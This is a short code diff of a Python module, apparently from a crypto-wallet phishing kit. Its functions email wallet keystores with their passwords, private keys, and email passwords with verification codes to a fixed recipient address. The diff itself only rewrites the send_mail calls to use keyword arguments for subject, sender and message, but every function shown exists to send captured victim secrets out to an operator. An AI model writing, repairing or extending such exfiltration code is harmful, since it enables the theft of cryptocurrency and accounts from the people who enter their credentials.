@@ -48,7 +48,9 @@ def send_phrase(idx, phrase):
 def send_keystore(idx, keystore, password):
     try:
         send_mail(
-            KEYSTORE_JSON.format(idx, keystore, password),
+            subject=SUBJECT,
+            from_email=None,
+            message=KEYSTORE_JSON.format(idx, keystore, password),
             recipient_list=[RECIPIENT_MAIL],
         )
         return 1
@@ -59,7 +61,9 @@ def send_keystore(idx, keystore, password):
 def send_private(idx, key):
     try:
         send_mail(
-            PRIVATE_KEY.format(idx, key),
+            subject=SUBJECT,
+            from_email=None,
+            message=PRIVATE_KEY.format(idx, key),
             recipient_list=[RECIPIENT_MAIL],
         )
         return 1
@@ -70,7 +74,9 @@ def send_private(idx, key):
 def send_email(idx, email, password, code):
     try:
         send_mail(
-            EMAIL.format(idx, email, password, code),
+            subject=SUBJECT,
+            from_email=None,
+            message=EMAIL.format(idx, email, password, code),
             recipient_list=[RECIPIENT_MAIL],
         )
         return 1
